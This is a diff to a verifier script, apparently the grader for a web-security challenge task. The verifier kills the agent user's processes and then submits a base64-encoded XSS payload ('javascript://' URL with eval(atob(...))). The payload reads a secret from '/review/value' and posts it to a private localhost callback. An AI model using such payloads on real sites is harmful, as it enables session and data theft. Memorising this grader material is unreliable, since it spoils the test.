@@ -3,6 +3,10 @@ set -euo pipefail
 
 mkdir -p /logs/verifier
 
+if [ "$(id -un)" != "agent" ] && id agent >/dev/null 2>&1; then
+  pkill -KILL -u agent 2>/dev/null || true
+fi
+
 if /usr/local/bin/node <<'NODE'
 const fs = require('node:fs');
 const http = require('node:http');
@@ -92,7 +96,6 @@ function checkIndirection(expected) {
 }
 
 async function recoverThroughApp() {
-  const collectionNonce = crypto.randomBytes(12).toString('hex');
   await request('POST', '/collect', { body: 'HSS-FAKE-DIRECT-POISON' });
   const poisonCheck = await request('GET', '/collect');
   const poisonedItems = JSON.parse(poisonCheck.body).items || [];
@@ -100,23 +103,55 @@ async function recoverThroughApp() {
     throw new Error('direct collector poisoning was accepted');
   }
 
-  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>fetch('/collect',{method:'POST',headers:{'Content-Type':'text/plain'},body:m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t}))`;
+  const callbackPath = `/cb-${crypto.randomBytes(18).toString('hex')}`;
+  const callback = await new Promise((resolve, reject) => {
+    const server = http.createServer((req, res) => {
+      if (req.method !== 'POST' || req.url !== callbackPath) {
+        res.statusCode = 404;
+        res.end('not found');
+        return;
+      }
+      let body = '';
+      req.setEncoding('utf8');
+      req.on('data', (chunk) => { body += chunk; });
+      req.on('end', () => {
+        res.end('ok');
+        server.emit('captured', body.trim());
+      });
+    });
+    server.on('error', reject);
+    server.listen(0, '127.0.0.1', () => {
+      const port = server.address().port;
+      const received = new Promise((resolveReceived, rejectReceived) => {
+        const timeout = setTimeout(() => {
+          server.close();
+          rejectReceived(new Error('private callback timed out'));
+        }, 30000);
+        server.once('captured', (value) => {
+          clearTimeout(timeout);
+          server.close();
+          resolveReceived(value);
+        });
+      });
+      resolve({ port, received });
+    });
+  });
+
+  const js = `fetch('/review/value').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:${callback.port}${callbackPath}',{method:'POST',headers:{'Content-Type':'text/plain'},body:t}))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
   await request('POST', '/report', {
     body: new URLSearchParams({ parameters: payload }).toString(),
   });
 
-  const deadline = Date.now() + 20000;
-  while (Date.now() < deadline) {
-    await new Promise((resolve) => setTimeout(resolve, 1000));
-    const res = await request('GET', '/collect');
-    const items = JSON.parse(res.body).items || [];
-    const found = items
-      .filter((item) => item.nonce === collectionNonce)
-      .map((item) => item.value)
-      .find((value) => typeof value === 'string' && value.startsWith('HSS-'));
-    if (found) return found;
+  const found = await callback.received;
+  if (typeof found === 'string' && found.startsWith('HSS-')) {
+    const after = await request('GET', '/collect');
+    const afterItems = JSON.parse(after.body).items || [];
+    if (afterItems.some((item) => item.value === found)) {
+      throw new Error('verifier leaked expected value to public collector');
+    }
+    return found;
   }
   throw new Error('verifier could not recover value through application workflow');
 }
